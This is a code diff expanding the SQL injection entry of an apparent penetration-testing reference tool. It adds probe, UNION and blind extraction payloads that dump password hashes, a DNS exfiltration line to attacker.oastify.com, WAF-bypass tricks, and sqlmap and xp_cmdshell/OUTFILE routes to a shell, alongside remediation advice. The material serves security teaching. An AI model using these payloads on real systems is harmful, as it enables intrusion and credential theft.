@@ -267,35 +267,133 @@ var VULNS = [
         severity: "Critical",
         ref: "https://portswigger.net/web-security/sql-injection",
         description: "User input reaches a SQL query unsanitized, letting an attacker read, modify, or destroy database data — and sometimes reach the OS.",
-        brief: "SQL injection happens when user-controlled input is concatenated into a SQL query instead of being bound as a parameter. The database cannot tell the attacker's data from the developer's code, so a crafted value changes the query's meaning.\n\nImpact: dump other users' rows, bypass authentication, and — with enough database privilege — read/write files and execute commands on the database host. It remains one of the most serious and common web vulnerabilities.",
+        brief: "SQL injection occurs when user-controlled input is concatenated into a SQL statement instead of being bound as a parameter. The database receives one flat string of text and has no way to tell where the developer's intended query ends and the attacker's data begins, so a value like ' OR '1'='1 stops being data and becomes part of the query's logic. This confusion of code and data is the root of the entire vulnerability class.\n\nSQLi comes in several flavours defined by how results come back to you. In-band injection returns data directly in the response — either through a UNION SELECT that appends attacker-chosen columns, or through a database error message that leaks the value you asked for. Blind injection returns no data at all: you recover it one bit at a time by asking true/false questions and observing a difference in the page (boolean-blind) or by forcing a measurable delay (time-blind). Out-of-band injection exfiltrates data over a separate channel such as DNS when the response itself reveals nothing.\n\nImpact is severe and wide-ranging: dumping every user's credentials and PII, bypassing authentication with a single request, tampering with or destroying records, and — where the database account is privileged — reading and writing files on the server and executing operating-system commands (xp_cmdshell on MSSQL, INTO OUTFILE web shells on MySQL, large-object abuse and COPY on PostgreSQL). Despite being decades old it remains one of the most common and most damaging web vulnerabilities because a single unparameterised query anywhere in a large codebase is enough.",
         quickReference: [
-          { label: "Break the query (probe)", cmd: "'   ' OR '1'='1   ' OR 1=1-- -   \" OR \"\"=\"" },
-          { label: "UNION column count", cmd: "' ORDER BY 5-- -   then  ' UNION SELECT NULL,NULL,NULL-- -" },
-          { label: "Time-based blind confirm", cmd: "' AND SLEEP(5)-- -   (MySQL)   '; WAITFOR DELAY '0:0:5'-- (MSSQL)" },
-          { label: "Automate", cmd: "sqlmap -r request.txt --batch --dbs" }
+          { label: "Break the query (probe)", cmd: "'   ' OR '1'='1   ' OR 1=1-- -   \" OR \"\"=\"   `   \\" },
+          { label: "UNION column count + extract", cmd: "' ORDER BY 5-- -   then  ' UNION SELECT NULL,version(),NULL-- -" },
+          { label: "Time-based blind confirm", cmd: "' AND SLEEP(5)-- -  (MySQL)   '||pg_sleep(5)-- (PG)   '; WAITFOR DELAY '0:0:5'-- (MSSQL)" },
+          { label: "Automate", cmd: "sqlmap -r request.txt --batch --dbs --level 5 --risk 3" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
+            title: "Root Cause & Mechanism",
+            type: "notes",
+            items: [
+              "The application builds a query by string concatenation — e.g. \"SELECT * FROM users WHERE id = '\" + input + \"'\" — so the input is parsed as part of the SQL grammar rather than as an opaque value.",
+              "A single quote (') closes the string literal the developer opened; everything after it is interpreted as SQL until you either balance the quotes or comment out the remainder (-- -, #, or /* */).",
+              "The fix (parameterised queries) works because the query text and the data are sent to the database separately — the data can never change the parsed statement, no matter what characters it contains.",
+              "Numeric contexts (WHERE id = 1) are injectable without any quote at all, since the value is not wrapped in a string literal.",
+              "Not just SELECT: INSERT, UPDATE, DELETE, ORDER BY, LIMIT, table/column names, and stored procedures are all reachable sinks, and each needs a slightly different injection shape."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Every parameter that could touch a query: URL query strings, POST body fields, JSON values, cookies, and HTTP headers (User-Agent, Referer, X-Forwarded-For are logged/queried surprisingly often).",
+              "Login forms, search boxes, filters, sort/order controls, pagination (limit/offset), and report generators are classic entry points.",
+              "ORDER BY and column-name positions cannot be parameterised, so dynamic sorting is a common real-world injection point even in otherwise-safe codebases.",
+              "Second-order sinks: a value stored safely on one request (a username, a profile field) and later concatenated into a query on another request — test stored data, not just the immediate reflection.",
+              "APIs and GraphQL resolvers that pass arguments into hand-written SQL behind the scenes."
+            ]
+          },
+          {
+            title: "Step 1 — Detect the Injection Point",
             type: "commands",
             commands: [
-              { label: "1. Detect — break the query and watch the response", cmd: "# a single quote causes a 500 / SQL error / different response\nid=1'\n# boolean pair differs -> injectable:\nid=1' AND '1'='1   (normal)   vs   id=1' AND '1'='2   (empty)" },
-              { label: "2. Determine the injection type", cmd: "# error-based: the DB echoes an error containing data\n# UNION: results returned in the page -> extract directly\nid=1' ORDER BY 6-- -            # find column count (errors at N+1)\nid=-1' UNION SELECT 1,version(),database(),4,5,6-- -" },
-              { label: "3. Blind (no output) — infer with boolean or time", cmd: "# boolean: ask true/false questions\nid=1' AND SUBSTRING(version(),1,1)='8'-- -\n# time-based when nothing is reflected:\nid=1' AND IF(1=1,SLEEP(5),0)-- -" },
-              { label: "4. Automate the extraction with sqlmap", cmd: "# capture the request in Burp -> request.txt, then:\nsqlmap -r request.txt --batch --dbs\nsqlmap -r request.txt -D appdb --tables\nsqlmap -r request.txt -D appdb -T users --dump" },
-              { label: "5. Escalate beyond data (high privilege only, in scope)", cmd: "sqlmap -r request.txt --is-dba --privileges\n# MSSQL: --os-shell (xp_cmdshell)   MySQL: --file-read/--file-write (webshell)\n# stop at a proof unless full exploitation is authorised" }
+              { label: "Break the syntax", cmd: "# submit a single quote and watch for a 500, a DB error, or a changed response\nid=1'\nid=1\"\nid=1`\n# a backslash can also break escaping: id=1\\" },
+              { label: "Prove it with a boolean pair", cmd: "# TRUE condition -> normal page, FALSE condition -> different/empty page\nid=1' AND '1'='1-- -      # renders normally\nid=1' AND '1'='2-- -      # differs  => the input reaches the query logic\n# numeric context (no quotes):\nid=1 AND 1=1        vs      id=1 AND 1=2" },
+              { label: "Prove it with arithmetic (numeric fields)", cmd: "# if id=3-1 returns the same row as id=2, the value is evaluated as SQL\nid=2\nid=3-1" },
+              { label: "Confirm with a time delay when nothing changes", cmd: "# a reliable oracle when the page looks identical either way\nid=1' AND SLEEP(5)-- -\nid=1'||pg_sleep(5)-- -\nid=1'; WAITFOR DELAY '0:0:5'-- -" }
+            ]
+          },
+          {
+            title: "Step 2 — Fingerprint the Database",
+            type: "commands",
+            commands: [
+              { label: "Version strings per DBMS", cmd: "MySQL/MariaDB : ' UNION SELECT @@version-- -        or version()\nPostgreSQL    : ' UNION SELECT version()-- -\nMSSQL         : ' UNION SELECT @@version-- -\nOracle        : ' UNION SELECT banner FROM v$version-- -   (needs FROM dual for scalars)\nSQLite        : ' UNION SELECT sqlite_version()-- -" },
+              { label: "Behavioural fingerprints (blind)", cmd: "# string concatenation differs per engine:\nMySQL     : CONCAT('a','b')  or 'a' 'b'\nMSSQL     : 'a'+'b'\nOracle/PG : 'a'||'b'\n# time functions differ (see the delay payloads) — a working SLEEP vs pg_sleep vs WAITFOR tells you the engine" },
+              { label: "Error-based leakage (fast when errors show)", cmd: "MySQL   : ' AND extractvalue(1,concat(0x7e,version()))-- -\nMSSQL   : ' AND 1=CONVERT(int,@@version)-- -\nPostgres: ' AND 1=cast(version() as int)-- -" }
+            ]
+          },
+          {
+            title: "Step 3 — In-band Exploitation (UNION)",
+            type: "commands",
+            commands: [
+              { label: "Find the column count", cmd: "# increase until it errors, or use NULLs until the page renders\n' ORDER BY 1-- -   ' ORDER BY 2-- -   ...   (errors at count+1)\n' UNION SELECT NULL-- -   ' UNION SELECT NULL,NULL-- -   ..." },
+              { label: "Find a column that renders text", cmd: "# replace one NULL at a time with a marker string to see which prints\n' UNION SELECT 'aaa',NULL,NULL-- -\n' UNION SELECT NULL,'aaa',NULL-- -   # note the visible position(s)" },
+              { label: "Enumerate the schema (MySQL/PG/MSSQL)", cmd: "# list databases / current context\n' UNION SELECT schema_name,NULL FROM information_schema.schemata-- -\n# list tables\n' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -\n# list columns\n' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -" },
+              { label: "Dump the data", cmd: "' UNION SELECT username,password FROM users-- -\n# concat many columns into one visible position:\n' UNION SELECT concat(username,0x3a,password),NULL FROM users-- -   (MySQL)\n' UNION SELECT username||':'||password,NULL FROM users-- -           (PG/Oracle)" },
+              { label: "Oracle note", cmd: "# Oracle SELECTs need a FROM; use dual, and it has no LIMIT\n' UNION SELECT banner,NULL FROM v$version-- -\n# tables: SELECT table_name FROM all_tables ; columns: all_tab_columns" }
+            ]
+          },
+          {
+            title: "Step 4 — Blind Exploitation (Boolean & Time)",
+            type: "commands",
+            commands: [
+              { label: "Boolean-blind: extract character by character", cmd: "# is the first char of the admin password hash 'a'? true page vs false page\n' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -\n# binary-search the ASCII value to cut requests ~log2(n):\n' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77-- -" },
+              { label: "Time-blind: same logic, timing oracle", cmd: "MySQL   : ' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>77,SLEEP(3),0)-- -\nPostgres: ' AND (SELECT CASE WHEN (condition) THEN pg_sleep(3) ELSE pg_sleep(0) END)-- -\nMSSQL   : ' IF (condition) WAITFOR DELAY '0:0:3'-- -" },
+              { label: "Discover length first", cmd: "# find the string length so you know how many chars to walk\n' AND LENGTH((SELECT password FROM users LIMIT 1))=32-- -" },
+              { label: "Out-of-band (OAST) when there is no oracle at all", cmd: "# MySQL (Windows, if allowed): DNS lookup carrying data\n' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.oastify.com\\\\a'))-- -\n# MSSQL: master..xp_dirtree '\\\\<data>.attacker.oastify.com\\a'\n# use a Burp Collaborator / interactsh listener to catch the callback" }
+            ]
+          },
+          {
+            title: "DBMS Cheat Sheet",
+            type: "table",
+            columns: ["Task", "MySQL", "MSSQL", "PostgreSQL", "Oracle"],
+            rows: [
+              ["Comment", "-- - or #", "-- -", "-- -", "-- -"],
+              ["Version", "@@version", "@@version", "version()", "banner FROM v$version"],
+              ["Current DB", "database()", "db_name()", "current_database()", "SELECT user FROM dual"],
+              ["Concatenate", "CONCAT(a,b)", "a+b", "a||b", "a||b"],
+              ["Substring", "SUBSTRING(s,1,1)", "SUBSTRING(s,1,1)", "SUBSTR(s,1,1)", "SUBSTR(s,1,1)"],
+              ["Delay", "SLEEP(5)", "WAITFOR DELAY '0:0:5'", "pg_sleep(5)", "dbms_pipe.receive_message(('a'),5)"],
+              ["Row limit", "LIMIT 1 OFFSET 0", "TOP 1 / OFFSET FETCH", "LIMIT 1 OFFSET 0", "ROWNUM / FETCH FIRST"]
             ]
           },
           {
             title: "Injection Types",
             type: "table",
-            columns: ["Type", "Detail"],
+            columns: ["Type", "How it works", "When to use it"],
             rows: [
-              ["In-band (UNION/error)", "Results or errors returned directly in the response"],
-              ["Boolean blind", "A true/false condition changes the response subtly"],
-              ["Time blind", "Infer true/false from a deliberate SLEEP/WAITFOR delay"],
-              ["Stacked queries", "A second statement after ; enables writes and sometimes RCE"],
-              ["Second-order", "Input is stored, then used unsafely in a later query"]
+              ["UNION (in-band)", "Append your own SELECT columns to the result set", "Query results are rendered on the page"],
+              ["Error-based (in-band)", "Force the DB to put data inside an error message", "Verbose DB errors are shown"],
+              ["Boolean-blind", "A true/false condition changes the page subtly", "No data shown, but page differs on true vs false"],
+              ["Time-blind", "A conditional SLEEP/WAITFOR delays the response", "Page is identical either way"],
+              ["Out-of-band (OAST)", "Data exfiltrated via DNS/HTTP callback", "No visible or timing oracle exists"],
+              ["Stacked queries", "A second statement after ; runs writes/procedures", "Driver allows multiple statements (MSSQL, PG)"],
+              ["Second-order", "Stored input is used unsafely in a later query", "Reflection is safe but storage is not"]
+            ]
+          },
+          {
+            title: "WAF & Filter Bypass",
+            type: "commands",
+            commands: [
+              { label: "Defeat keyword blocklists", cmd: "# inline comments split keywords:  UN/**/ION SE/**/LECT\n# case has no meaning to SQL:        uNiOn sELeCt\n# MySQL versioned comments execute:  /*!50000UNION*//*!50000SELECT*/" },
+              { label: "Avoid blocked characters", cmd: "# no spaces -> comments or parentheses/tabs/newlines\n'/**/OR/**/1=1-- -      'OR(1)=(1)-- -      '%0aOR%0a1=1-- -\n# no quotes -> hex or CHAR():   WHERE name=0x61646d696e   or  CHAR(97,100,109,105,110)" },
+              { label: "Avoid = and comparison filters", cmd: "# use LIKE, IN, or BETWEEN instead of =\n' OR username LIKE 'adm%'-- -\n' OR id BETWEEN 1 AND 9999-- -" },
+              { label: "Encoding & normalisation tricks", cmd: "# double URL-encoding, unicode homoglyphs, and overlong forms can slip past a WAF that decodes differently from the app\n%2527  ->  %27  ->  '\n# sqlmap tamper scripts automate these:\nsqlmap -r req.txt --tamper=space2comment,between,charencode --level 5 --risk 3" }
+            ]
+          },
+          {
+            title: "Step 5 — Automating with sqlmap",
+            type: "commands",
+            commands: [
+              { label: "Point it at a captured request", cmd: "# save the raw request from Burp (right-click -> copy to file) as request.txt\nsqlmap -r request.txt --batch\n# target a specific parameter and be thorough:\nsqlmap -r request.txt -p id --level 5 --risk 3 --dbms mysql" },
+              { label: "Enumerate", cmd: "sqlmap -r request.txt --dbs\nsqlmap -r request.txt -D appdb --tables\nsqlmap -r request.txt -D appdb -T users --columns\nsqlmap -r request.txt -D appdb -T users -C username,password --dump" },
+              { label: "Tune detection & evade", cmd: "sqlmap -r request.txt --technique=BEUST      # restrict/expand techniques\nsqlmap -r request.txt --tamper=between,space2comment --random-agent\nsqlmap -r request.txt --delay 1 --time-sec 5  # go slow to dodge rate limits" },
+              { label: "Escalate (authorised engagements only)", cmd: "sqlmap -r request.txt --is-dba --privileges\nsqlmap -r request.txt --file-read=/etc/passwd\nsqlmap -r request.txt --os-shell        # MSSQL xp_cmdshell / MySQL UDF / PG\n# stop at a screenshot-worthy proof unless full exploitation is in scope" }
+            ]
+          },
+          {
+            title: "Beyond Data — Files & RCE",
+            type: "table",
+            columns: ["DBMS", "Read file", "Write file / RCE path"],
+            rows: [
+              ["MySQL", "LOAD_FILE('/etc/passwd')", "SELECT '<?php ...?>' INTO OUTFILE '/var/www/shell.php' (needs FILE priv + secure_file_priv unset)"],
+              ["MSSQL", "OPENROWSET(BULK ...)", "EXEC xp_cmdshell 'whoami' (if enabled); re-enable via sp_configure if sysadmin"],
+              ["PostgreSQL", "pg_read_file('/etc/passwd')", "COPY ... FROM PROGRAM 'cmd' (superuser), or a C/plperlu function"],
+              ["Oracle", "UTL_FILE package", "DBMS_SCHEDULER / Java stored procedures for command execution"]
             ]
           },
           {
@@ -304,9 +402,10 @@ var VULNS = [
             columns: ["Step", "Action", "Result"],
             rows: [
               ["1", "Find an injectable parameter", "Confirmed SQLi point"],
-              ["2", "Identify type + DBMS + columns", "A working extraction technique"],
-              ["3", "Dump data (users, hashes, PII)", "Sensitive data / auth bypass"],
-              ["4", "Read/write files, xp_cmdshell (if DBA)", "RCE on the DB host"]
+              ["2", "Fingerprint DBMS + injection type + column count", "A working extraction technique"],
+              ["3", "Enumerate schema, dump users/hashes/PII", "Sensitive data / auth bypass"],
+              ["4", "Crack hashes or use plaintext creds", "Application / admin access"],
+              ["5", "If DBA: read/write files, xp_cmdshell / OUTFILE", "RCE on the DB host, pivot inward"]
             ]
           },
           {
@@ -314,18 +413,21 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["sqlmap", "Automated detection, extraction, and OS/file takeover"],
-              ["Burp Suite", "Manual probing, capturing the request, Intruder"],
-              ["ghauri / NoSQLMap", "Alternative injection automation"],
-              ["hashcat", "Crack dumped password hashes"]
+              ["sqlmap", "Automated detection, extraction, tamper-based WAF evasion, and OS/file takeover"],
+              ["ghauri", "Fast alternative to sqlmap, strong on blind/time-based"],
+              ["Burp Suite", "Manual probing, capturing the request, Intruder for boolean/char extraction"],
+              ["Burp Collaborator / interactsh", "Catch out-of-band DNS/HTTP callbacks for OAST injection"],
+              ["hashcat / John", "Crack password hashes recovered from the dump"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
-              { label: "PortSwigger — SQL injection", url: "https://portswigger.net/web-security/sql-injection" },
+              { label: "PortSwigger — SQL injection (with labs)", url: "https://portswigger.net/web-security/sql-injection" },
+              { label: "PortSwigger — SQLi cheat sheet (per-DBMS syntax)", url: "https://portswigger.net/web-security/sql-injection/cheat-sheet" },
               { label: "OWASP — SQL Injection Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html" },
+              { label: "OWASP WSTG — Testing for SQL Injection", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection" },
               { label: "PayloadsAllTheThings — SQLi", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" }
             ]
           },
@@ -333,11 +435,13 @@ var VULNS = [
             title: "Remediation",
             type: "notes",
             items: [
-              "Use parameterised queries / prepared statements everywhere — the one fix that works. Never build SQL by string concatenation.",
-              "Use an ORM correctly and beware raw-query escape hatches that reintroduce the bug.",
-              "Apply least privilege to the DB account (no FILE, no xp_cmdshell, no DBA) so a bug is not automatically RCE.",
-              "Allow-list where structure is dynamic (ORDER BY column names) since parameters cannot bind identifiers.",
-              "Treat input validation and a WAF as defense-in-depth, not a substitute for parameterisation."
+              "Use parameterised queries / prepared statements for every query, without exception — this is the one fix that actually works because it sends code and data to the database separately.",
+              "Java: use PreparedStatement with ? placeholders (never Statement + string concatenation). PHP: PDO with prepare()/execute() and real bound parameters (not emulated). Python: pass params as the second argument to cursor.execute(query, (val,)), never %-format the SQL. Node: parameterised queries ($1, ? placeholders), never template-literal SQL.",
+              "Use an ORM's query builder correctly, and treat every raw-query escape hatch (e.g. .raw(), sequelize.query, EF FromSqlRaw) as a manual concatenation risk that must be parameterised.",
+              "For structural elements that cannot be bound (ORDER BY columns, table names, ASC/DESC), validate against a strict server-side allow-list of known-good values — never pass user text through.",
+              "Apply least privilege to the database account: no FILE/OUTFILE, no xp_cmdshell, not a DBA/superuser, and only the specific tables the app needs, so that even a successful injection cannot become RCE.",
+              "Add defence-in-depth — input validation, a tuned WAF, and disabling detailed DB error messages in production — but never rely on these instead of parameterisation, as every one of them can be bypassed.",
+              "Add regression tests and use static analysis / SAST to catch new string-concatenated queries before they ship."
             ]
           }
         ]
